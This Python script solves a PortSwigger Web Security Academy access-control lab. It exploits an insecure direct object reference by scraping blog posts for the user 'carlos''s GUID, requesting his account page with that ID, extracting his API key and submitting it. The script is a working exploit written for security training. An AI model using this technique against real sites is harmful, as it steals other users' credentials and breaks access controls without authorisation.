#!/usr/bin/env python3
# Lab: User ID controlled by request parameter, with unpredictable user IDs
# Lab-Link: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids

from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_guid(client, host):
    for i in range(1, 20):
        url = f'{host}/post?postId={i}'
        soup = BeautifulSoup(client.get(url).text, 'html.parser')
        res = None
        try:
            res = soup.find('span', attrs={'id': 'blog-author'})
            res = res.find('a', text='carlos')
            if res is not None and 'carlos' in res:
                return res.get('href').split('=')[1]

        except:  # noqa E722
            continue

    return None


def get_api_key(client, host, guid):
    url = f'{host}/my-account?id={guid}'
    soup = BeautifulSoup(client.get(url).text, 'html.parser')
    key = None
    try:
        key = soup.find('p', text='Your username is: carlos').find_next('div').text.split(':')[1].strip()
    except:  # noqa: E722
        pass
    return key


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    guid = find_guid(client, host)
    if not guid:
        print(f'[-] Failed to find GUID of carlos')
        sys.exit(-2)
    print(f'[+] Obtained GUID of carlos: {guid}')

    answer = get_api_key(client, host, guid)
    if not answer:
        print(f'[-] Failed to obtain API key of carlos')
        sys.exit(-3)
    print(f'[+] Obtained API key of carlos: {answer}')

    data = {'answer': answer}
    if '"correct":true' in client.post(f'{host}/submitSolution', data=data).text:
        print(f'[+] Successfully submitted key, lab solved')
    else:
        print(f'[-] Failed to solve lab')


if __name__ == "__main__":
    main()